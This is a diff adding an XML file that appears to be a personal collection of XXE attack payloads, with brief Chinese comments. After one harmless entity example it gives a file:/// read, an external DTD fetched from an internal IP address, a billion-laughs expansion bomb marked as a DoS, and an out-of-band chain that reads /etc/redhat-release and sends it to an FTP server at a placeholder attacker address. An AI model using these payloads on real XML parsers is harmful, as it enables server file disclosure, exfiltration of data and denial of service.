@@ -1,0 +1,54 @@
+<?xml version="1.0" ?>
+<!DOCTYPE note [
+    <!ELEMENT note (to, form, heading, body)>
+    <!ELEMENT to (#PCDATA)>
+    <!ELEMENT form (#PCDATA)>
+    <!ELEMENT heading (#PCDATA)>
+    <!ELEMENT body ANY>
+    <!ENTITY author "zhangsan">
+]>
+<note>
+    <to>tom</to>    
+    <form>kali</form>
+    <heading>hhh</heading>
+    <body>&author;</body>
+    
+</note>
+
+<?xml version="1.0"?>
+<!DOCTYPE t [
+    <!ENTITY xxe SYSTEM "file:///">
+]><t>&xxe;</t>
+
+<?xml version="1.0"?>
+<!DOCTYPE hack [
+    <!ENTITY xxe SYSTEM "http://192.168.10.230:8000/aa.dtd">
+]>
+<hack>&send;</hack>
+
+<!-- ddos -->
+<?xml version="1.0"?>
+<!DOCTYPE dos [
+    <!ENTITY d1 "abc">
+    <!ENTITY d2 "&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;&d1;">
+    <!ENTITY d3 "&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;&d2;">
+    <!ENTITY d4 "&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;&d3;">
+    <!ENTITY d5 "&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;&d4;">
+    <!ENTITY d6 "&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;&d5;">
+    <!ENTITY d7 "&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;&d6;">
+    <!ENTITY d8 "&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;&d7;">
+    <!ENTITY d9 "&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;&d8;">
+]>
+<dos>&d9;</dos>
+
+<!-- eval.xml -->
+<!ENTITY % payload SYSTEM "file:///etc/redhat-release">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'ftp://yourserverip:port/%payload;'>">
+%int;
+%trick;
+
+<!-- 上传的文件 -->
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://yourserverip/eval.xml">
+%remote;
+]>
